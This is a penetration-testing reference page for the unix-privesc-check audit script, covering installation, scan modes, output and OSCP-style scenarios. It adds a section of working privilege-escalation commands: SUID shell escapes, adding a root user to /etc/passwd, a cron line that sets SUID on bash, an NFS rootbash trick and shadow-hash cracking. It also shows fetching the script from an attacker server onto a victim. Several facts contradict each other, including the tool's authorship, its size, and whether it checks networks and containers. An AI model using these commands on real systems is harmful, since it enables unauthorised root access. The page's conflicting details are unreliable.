---
title: "unix-privesc-check"
description: "Shell-based privilege escalation checker for Unix/Linux systems. Detects misconfigurations that allow local users to escalate privileges or access local applications."
category: "privilege-escalation"
tool_name: "unix-privesc-check"
mitre_tactic: "privilege_escalation"
mitre_tactic_id: "TA0004"
difficulty: "beginner"
os: ["linux", "unix", "solaris", "freebsd", "macos"]
language: ["shell"]
license: "GPL-2.0"
kali_path: "/usr/bin/unix-privesc-check"
github: "https://github.com/pentestmonkey/unix-privesc-check"
official_docs: "https://www.kali.org/tools/unix-privesc-check/"
install_command: "sudo apt install unix-privesc-check"
---

# unix-privesc-check

unix-privesc-check is a single-file shell script that audits file permissions and system settings for common privilege escalation vectors on Unix/Linux systems. Written by pentestmonkey, it runs as a normal user or root, checking world-writable files, SUID/SGID binaries, cron jobs, and misconfigured services. Its minimal dependencies make it ideal for restricted environments.

## 1. Overview

**What It Does:** Scans the system for misconfigurations that could allow a local unprivileged user to escalate privileges. Checks include file permissions, SUID/SGID binaries, cron jobs, Sudo configurations, NFS exports, `/etc/passwd` writable, and network listening services.

**Why It Matters:** When a system has limited tools installed — no Python, no Go, no curl — unix-privesc-check works because it is pure POSIX shell. It runs anywhere `sh` runs. It is smaller, simpler, and faster than LinPEAS, making it the first choice on minimal systems.

**Key Distinction:** unix-privesc-check focuses on file-permission-based misconfigurations. It does not brute-force passwords, monitor processes for transient cron jobs, scan for API keys, or perform network reconnaissance. It is a surgical check, not a full enumeration suite.

**Target Audience:** OSCP exam takers, CTF players, penetration testers working on hardened systems with minimal tooling.

**Author and History:** Originally written by Mike Czumak (@SecuritySift) as part of the SecuritySift linuxprivchecker lineage. Currently maintained by Michael Contino (@Sleventyeleven). The tool has been a staple in OSCP preparation since 2014.

## 2. Installation & Access

### On Kali Linux

```bash
sudo apt install unix-privesc-check
```

**Explanation:** Installs the `unix-privesc-check` package. The tool is available in the default, large, and everything metapackages. Installed size is approximately 85KB.

### Direct Download

```bash
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check
chmod +x unix-privesc-check
```

**Explanation:** Download the single shell script directly. No installation required. Transfer to any Unix system via SCP, HTTP, netcat, or USB.

### Transfer to Target

```bash
# Python HTTP server on attacker
sudo python3 -m http.server 8000

# On victim — download and run
curl http://10.10.14.20:8000/unix-privesc-check > /tmp/upc
chmod +x /tmp/upc
/tmp/upc standard
```

**Explanation:** The script is a single file with no dependencies. Transfer it, make it executable, run it. The entire process takes seconds.

### Verify Installation

```bash
unix-privesc-check -h
```

**Explanation:** The `-h` flag prints the help message with version information (currently v1.4) and available modes.

## 3. Core Functionality

### Check Categories

| Category | What It Checks |
|---|---|
| **File Permissions** | World-writable files in critical directories (`/etc`, `/bin`, `/usr/bin`, `/usr/local/bin`) |
| **SUID/SGID Binaries** | All files with SUID/SGID bits set, with permission analysis and known-vulnerable checks |
| **Cron Jobs** | System cron (`/etc/cron*`), user crontabs, anacron, writable cron scripts |
| **Sudo** | `sudo -l` output, NOPASSWD entries, sudo version vulnerabilities |
| **Passwd/Shadow** | Writable `/etc/passwd`, readable `/etc/shadow`, empty passwords in `/etc/passwd` |
| **NFS** | No Root Squash exports, writable NFS shares |
| **Network** | Listening services, open ports, running processes |
| **Kernel** | Kernel version detection and known vulnerability cross-reference |
| **SSH** | Authorized keys locations, private keys, SSH agent forwarding |
| **Home Directories** | Permissions on user home directories, bash history, config files, `.forward` and `.netrc` files |
| **Temporary Files** | World-writable directories in `$PATH`, `/tmp` and `/var/tmp` sticky bit |
| **Mount Points** | Filesystem mount options, noexec/nosuid effectiveness |
| **Resource Limits** | Core dump configuration, ulimit settings |
| **Users and Groups** | All users, group memberships, UID 0 accounts, empty password fields |

### Execution Modes

**standard** — Speed-optimized. Checks the most common vectors. Takes 5-30 seconds. Covers approximately 80% of common privilege escalation paths. This is the recommended mode for most assessments.

**detailed** — Also checks permissions of open file handles and called files (parsed from shell scripts, linked `.so` files). Slow (30 seconds to several minutes), prone to false positives, but catches subtle flaws in third-party programs that standard mode misses.

### How Checks Work

The tool uses a simple pattern:

1. Print a section header (e.g., `############################################`)
2. Print the check name (e.g., `Checking for writable /etc/passwd`)
3. Run the check (file permission test, grep, find, etc.)
4. Print `WARNING` if a misconfiguration is found
5. Print context about the finding

If no `WARNING` appears in the output, the tool found no issues.

## 4. Usage Examples

### Standard Mode Scan

```bash
unix-privesc-check standard
```

**Explanation:** Runs the full standard audit. Outputs "WARNING" for every finding. If you see no "WARNING" in the output, no issues were found. Takes 5-30 seconds depending on system size and number of installed packages.

### Detailed Mode Scan

```bash
unix-privesc-check detailed
```

**Explanation:** Adds open file handle checks, parsed shell script dependency analysis, and `.so` library permission checks. Much slower but catches issues that standard mode misses. Use this when standard mode returns no findings but you suspect issues exist.

### Save Output to File

```bash
unix-privesc-check standard > /tmp/upc_results.txt 2>&1
```

**Explanation:** Redirect both stdout and stderr to a file. Use `grep WARNING /tmp/upc_results.txt` to extract only findings. The `2>&1` captures any error messages that might indicate incomplete checks.

### Run as Non-Root User

```bash
# As low-privilege user
./unix-privesc-check standard
```

**Explanation:** Works as a normal user but with reduced visibility. Cannot read files owned by root, so misses some checks. Running as root gives complete coverage. The tool adapts its checks based on current user privileges.

### Grep for Warnings Only

```bash
unix-privesc-check standard 2>&1 | grep -i "WARNING"
```

**Explanation:** Filter output to show only WARNING lines. Reduces noise to actionable findings only. The `-i` flag makes the grep case-insensitive.

### Extract Findings with Context

```bash
unix-privesc-check standard 2>&1 | grep -B5 -A10 "WARNING"
```

**Explanation:** Show 5 lines before and 10 lines after each WARNING for context. Helps understand which check produced the warning and what the finding means.

### Check Specific Areas

```bash
# SUID-related findings
unix-privesc-check standard 2>&1 | grep -A10 -i "SUID"

# Cron-related findings
unix-privesc-check standard 2>&1 | grep -A10 -i "cron"

# Sudo-related findings
unix-privesc-check standard 2>&1 | grep -A10 -i "sudo"

# NFS-related findings
unix-privesc-check standard 2>&1 | grep -A10 -i "NFS"

# Writable file findings
unix-privesc-check standard 2>&1 | grep -A10 -i "writable"

# Passwd/shadow findings
unix-privesc-check standard 2>&1 | grep -A10 -i "passwd\|shadow"
```

**Explanation:** Extract specific categories of findings for focused analysis. Use this pattern when you know which vector to investigate.

### Count Total Warnings

```bash
unix-privesc-check standard 2>&1 | grep -c "WARNING"
```

**Explanation:** Quick count of total findings. A count of 0 means no issues were found. Higher counts indicate more misconfigurations.

### List All Check Sections

```bash
unix-privesc-check standard 2>&1 | grep "^####"
```

**Explanation:** List all section headers to understand what checks were performed. Useful for verifying that all checks ran successfully.

## 5. Output Format

The tool uses a simple, consistent structure:

```
############################################
Recording hostname
############################################
kali

############################################
Recording uname
############################################
Linux kali 6.1.0-kali5-amd64 #1 SMP Debian 6.1.10-2kali1 x86_64 GNU/Linux

############################################
Recording Interface IP addresses
############################################
eth0: 192.168.1.200

############################################
Checking if Hostname is in /etc/hosts
############################################
WARNING: Hostname 'kali' is in /etc/hosts

############################################
Checking for passwords in /etc/passwd
############################################
WARNING: User 'test' has no password (empty field in /etc/passwd)

############################################
Checking for SUID binaries
############################################
WARNING: SUID binary found: /usr/bin/vim

############################################
Checking /etc/crontab permissions
############################################
WARNING: /etc/crontab is world-writable
```

**Every check** has a section header with `####` delimiters. Findings are marked with `WARNING`. The absence of `WARNING` means the check passed. Section headers help identify which check produced each finding.

## 6. Practical Scenarios

### Scenario 1: Minimal System (No Python, No Curl)

On a stripped-down server where LinPEAS cannot run:

```bash
# Transfer the single shell script
scp unix-privesc-check root@192.168.1.100:/tmp/

# SSH in and run
ssh root@192.168.1.100
chmod +x /tmp/unix-privesc-check
/tmp/unix-privesc-check standard
```

**Why unix-privesc-check here:** The system has no Python, no Go binary support, and restricted network access. The 30KB shell script transfers instantly and runs with zero dependencies.

### Scenario 2: OSCP Exam (Clean Enumeration)

```bash
# Quick initial sweep
unix-privesc-check standard > /tmp/enum.txt 2>&1

# Review findings
grep WARNING /tmp/enum.txt
```

**Why unix-privesc-check here:** OSCP exam environments are controlled and predictable. The tool's output is clean and focused. No color codes to parse. Simple WARNING-based output is easy to read under time pressure.

**Caveat:** OSCP exam requires you to exploit findings manually. unix-privesc-check identifies vectors but does not exploit them.

### Scenario 3: Solaris/FreeBSD System

```bash
# Works on Solaris 9, HP-UX 11, FreeBSD 6.2, and modern variants
./unix-privesc-check standard
```

**Why unix-privesc-check here:** LinPEAS targets Linux primarily. unix-privesc-check has been tested on Solaris, HP-UX, FreeBSD, and other Unix variants. It handles the different file system layouts and command syntax.

### Scenario 4: Docker Container Audit

```bash
# Inside a container
./unix-privesc-check standard 2>&1 | grep -i "WARNING"
```

**Look for:** Writable `/etc/passwd`, SUID binaries, capabilities, Docker socket access, writable cron scripts.

### Scenario 5: Quick Pre-Exploitation Check

```bash
# Before exploiting a known vector, verify the environment
./unix-privesc-check standard 2>&1 | grep -E "SUID|cron|sudo|writable"
```

**Why unix-privesc-check here:** Fast verification of specific vectors before committing to an exploitation path.

### Scenario 6: Automated Batch Assessment

```bash
# Run on multiple hosts via SSH
for host in 192.168.1.{100..110}; do
    ssh user@$host "unix-privesc-check standard" > /tmp/upc_$host.txt 2>&1
done

# Aggregate findings
grep -l "WARNING" /tmp/upc_*.txt
```

**Why unix-privesc-check here:** Fast execution (seconds per host) makes batch assessment practical. LinPEAS would take 4-10 minutes per host.

### Scenario 7: Restricted Shell Environment

```bash
# When only basic POSIX utilities are available
# No bash, no python, no perl — just sh, find, grep, ls
./unix-privesc-check standard
```

**Why unix-privesc-check here:** Written in POSIX shell, it works in the most restrictive environments. Uses only basic utilities that exist on every Unix system.

### Scenario 8: Memory-Constrained System

```bash
# On a system with limited RAM
./unix-privesc-check standard > /tmp/results.txt 2>&1
```

**Why unix-privesc-check here:** The script uses minimal memory compared to LinPEAS (which loads larger scripts or binaries). On embedded systems or containers with memory limits, this matters.

## 7. Comparison: unix-privesc-check vs LinPEAS

| Feature | unix-privesc-check | LinPEAS |
|---|---|---|
| **Dependencies** | POSIX shell only | `/bin/sh` or Go binary |
| **Size** | ~30KB | ~3MB (shell), ~10MB (binary) |
| **Speed** | 5-30 seconds | 4-10 minutes |
| **Check Depth** | Basic permission-based | 300+ deep checks |
| **Password Brute-force** | No | Yes (`su` brute-force) |
| **Process Monitoring** | No | Yes (transient cron detection) |
| **API Key Scanning** | No | Yes (regex mode) |
| **Color Output** | No | Yes (color-coded findings) |
| **Network Recon** | No | Yes (host discovery, port scan) |
| **Container Detection** | Limited | Full (Docker, LXC, Podman) |
| **Firmware Analysis** | No | Yes (`-f` flag) |
| **False Positive Rate** | Higher in detailed mode | Lower (pattern-verified) |
| **Multi-Unix Support** | Solaris, HP-UX, FreeBSD | Linux, macOS, BSD |
| **Last Updated** | Infrequent | Actively maintained (2026) |

**Use unix-privesc-check when:** The system is minimal, you need a fast scan, or you are on a non-Linux Unix system.

**Use LinPEAS when:** You want comprehensive enumeration, have time for a deep scan, or need password brute-force and process monitoring.

## 8. Detailed Check Walkthrough

### File Permission Checks

```bash
# What the tool checks
# 1. World-writable files in /etc, /bin, /usr/bin, /usr/local/bin
find /etc /bin /usr/bin /usr/local/bin -perm -0002 -type f 2>/dev/null

# 2. Writable /etc/passwd
ls -la /etc/passwd

# 3. Readable /etc/shadow
cat /etc/shadow 2>/dev/null

# 4. Empty passwords in /etc/passwd
grep '^[^:]*::' /etc/passwd

# 5. Writable /etc/crontab
ls -la /etc/crontab

# 6. Writable cron directories
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.monthly/ /etc/cron.weekly/
```

### SUID/SGID Binary Checks

```bash
# What the tool checks
# 1. All SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 2. All SGID binaries
find / -perm -2000 -type f 2>/dev/null

# 3. Cross-references with known exploitable binaries
# (vim, find, bash, python, perl, ruby, etc.)
```

### Cron Job Checks

```bash
# What the tool checks
# 1. System crontab
cat /etc/crontab

# 2. Cron directories
ls -la /etc/cron.d/

# 3. User crontabs
ls -la /var/spool/cron/crontabs/

# 4. Anacron
cat /etc/anacrontab

# 5. Writable cron scripts
find /etc/cron* -writable 2>/dev/null
```

### Sudo Checks

```bash
# What the tool checks
# 1. Sudo permissions (without password)
sudo -l 2>/dev/null

# 2. Sudo version (known vulnerabilities)
sudo -V 2>/dev/null | head -1

# 3. NOPASSWD entries
grep -i "NOPASSWD" /etc/sudoers 2>/dev/null
```

### NFS Checks

```bash
# What the tool checks
# 1. NFS exports
cat /etc/exports 2>/dev/null

# 2. No Root Squash flag
grep "no_root_squash" /etc/exports 2>/dev/null

# 3. Writable NFS shares
```

## 9. Limitations and Caveats

**False Positives in Detailed Mode:** The detailed mode checks open file handles and parsed script dependencies. This produces many false positives because it reports permissions on every linked `.so` library and every file referenced in scripts. Manual verification is required for every finding.

**No Color Output:** All output is plain text. No highlighting for high-priority findings. You must manually grep for `WARNING`. This makes large outputs harder to scan visually compared to LinPEAS.

**No Exploitation:** The tool identifies misconfigurations but does not exploit them. You must understand the exploitation technique for each finding. Reference GTFOBins for exploitation guidance.

**Shell Compatibility:** While designed for POSIX `sh`, some checks may behave differently on `dash`, `bash`, `ksh`, or `zsh`. The script should work on all, but edge cases exist with `find` and `grep` syntax across implementations.

**Limited Modern Checks:** The tool does not check for newer PE vectors like systemd paths, D-Bus exploits, polkit vulnerabilities, container escape techniques, or capability-based escalation. Use LinPEAS for modern systems.

**No Regex/Secret Scanning:** Does not search for passwords, API keys, or tokens in files. Only checks file permissions and configurations.

**Stale Development:** The upstream repository has not been actively maintained with new features. Bug fixes are infrequent. LinPEAS is the actively developed alternative with regular updates.

**No Binary Mode:** No pre-compiled binary exists. If the target has no `sh` or the shell is too restricted, the tool cannot run.

**No Network Checks:** Does not enumerate network services, listening ports, or routing tables. Focuses exclusively on local file permission and configuration checks.

**No Container Awareness:** Does not detect Docker, LXC, or other container environments. Misses container-specific escape vectors.

## 10. Post-Enumeration Workflow

After unix-privesc-check completes, follow this systematic workflow.

### Step 1: Extract All Warnings

```bash
unix-privesc-check standard 2>&1 | grep -i "WARNING" | tee /tmp/warnings.txt
```

**Explanation:** Capture all findings into a file for offline analysis. The `tee` command displays output while simultaneously saving to file.

### Step 2: Categorize Each Finding

| Category | Priority | Examples |
|---|---|---|
| **Writable System Files** | Critical | `/etc/passwd`, `/etc/shadow`, `/etc/crontab` |
| **SUID Exploitable Binaries** | Critical | `vim`, `find`, `bash`, `python`, `nmap` |
| **Sudo Misconfig** | High | NOPASSWD entries, GTFOBins-exploitable commands |
| **Cron Abuse** | High | Writable cron scripts, PATH hijacking |
| **NFS No Root Squash** | High | Exported shares with no_root_squash |
| **Readable Credentials** | Medium | `/etc/shadow`, SSH keys, config files |
| **World-Writable Directories** | Medium | Writable directories in `$PATH` |
| **Kernel Version** | Low-Medium | Old kernel with known exploit |

### Step 3: Verify Each Finding

Never exploit without verification. For each WARNING:

```bash
# Verify writable file
ls -la <file_path>

# Verify SUID binary
ls -la <binary_path>
file <binary_path>

# Verify cron script
cat <cron_script_path>
ls -la <cron_script_path>

# Verify NFS export
cat /etc/exports
showmount -e <target_ip>
```

**Explanation:** Check that the finding is real and exploitable in the current context. A file marked "writable" may actually be on a read-only filesystem or protected by ACLs.

### Step 4: Exploit

Use GTFOBins (https://gtfobins.github.io/) for Linux exploitation techniques. Match each finding to the corresponding GTFOBins entry.

### Step 5: Document

Record each finding, verification step, and exploitation result. This documentation is essential for penetration test reports and CTF writeups.

## 11. Common Exploitation Techniques

### SUID Binary Escalation

```bash
# If unix-privesc-check finds SUID /usr/bin/vim
/usr/bin/vim -c ':!sh'

# If SUID /usr/bin/find
find -exec /bin/sh -p \;

# If SUID /usr/bin/bash
/bin/bash -p

# If SUID /usr/bin/python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# If SUID /usr/bin/perl
perl -e 'exec "/bin/sh";'

# If SUID /usr/bin/ruby
ruby -e 'exec "/bin/sh"'

# If SUID /usr/bin/env
env /bin/bash -p

# If SUID /usr/bin/nmap (older versions)
nmap --interactive
!sh

# If SUID /usr/bin/less
less /etc/passwd
# then type: !sh
```

### Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt xyz newpassword

# Add new root user
echo 'newuser:$1$xyz$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd
su newuser
```

### Writable Cron Scripts

```bash
# If /etc/crontab or cron script is writable
echo '* * * * * root chmod +s /bin/bash' >> /etc/crontab

# Wait for cron to execute
chmod +s /bin/bash
/bin/bash -p
```

### NFS No Root Squash

```bash
# From attacker machine
mkdir /tmp/nfs
mount -t nfs 192.168.1.100:/shared /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

# On victim
/shared/rootbash -p
```

### Readable /etc/shadow

```bash
# Extract hashes
cat /etc/shadow

# Crack with hashcat or john
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

## 12. Resources

- **GitHub Repository:** https://github.com/pentestmonkey/unix-privesc-check
- **Kali Linux Package:** https://www.kali.org/tools/unix-privesc-check/
- **Pentestmonkey Homepage:** http://pentestmonkey.net/tools/audit/unix-privesc-check
- **HackTricks Linux PE Checklist:** https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
- **OSCP Preparation Guide:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- **GTFOBins:** https://gtfobins.github.io/
- **Linux Exploit Suggester:** https://github.com/The-Z-Labs/linux-exploit-suggester
